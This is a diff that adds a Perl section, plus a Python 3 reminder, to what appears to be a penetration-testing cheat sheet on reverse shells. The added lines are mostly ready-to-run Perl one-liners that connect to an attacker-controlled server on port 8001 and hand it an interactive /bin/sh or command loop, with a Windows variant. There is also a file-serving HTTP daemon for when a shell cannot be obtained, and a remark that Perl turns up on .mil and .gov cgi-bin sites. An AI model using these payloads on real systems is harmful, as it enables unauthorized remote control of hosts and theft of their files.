@@ -81,6 +81,8 @@ Of course the reverse shell options are always going to be dependent on the inst
 - Then foreground again with fg. I have on occasion had to type reset as well.
 - Advantages to this is of course the ability to run things like ssh and vim have tab-complete, job control and history to mention a few.
 
+###### REMEMBER TO ALWAYS CHECK FOR PYTHON 3 IF YOU  GET PYTHON ERRORS OR NOT FOUND ERRORS
+
 #### When all else fails
 - And you can't get a shell, you could simply create a web interface to the current directory, using :
 
@@ -152,3 +154,24 @@ The best thing about php is that it is almost always installed (even if just for
 <hr>
 
 ### Perl
+Not found installed very often any more, but have found it mostly on .mil / .gov related sites that still make use of cgi-bin or cgi. But still a very good option if it is installed to pop a reverse shell :
+
+> perl -e "use Socket;\$i='\<yourserver>';$p=8001;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};"
+
+- As with every other reverse shell using a "dumb" shell link sh, use the trick above with python to spawn a fully functional shell
+- Another reverse shell option that does not use /bin/sh would be :
+
+	> perl -MIO -e "\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,'\<yourserver>:8001');STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;"
+
+- For windows based systems use the following :
+
+	> perl -MIO -e "\$c=new IO::Socket::INET(PeerAddr,'\<yourserver>:8001');STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;"
+
+- Again if all else fails scenario you could pop a http daemon to get a web interface :
+
+	> perl -MHTTP::Daemon -e '\$d = HTTP::Daemon->new(LocalPort => 8001) or die \$!; while (\$c = \$d->accept) { while (\$r = \$c->get_request) {\$c->send_file_response(".".\$r->url->path) } }'
+
+<hr>
+
+### Java
+
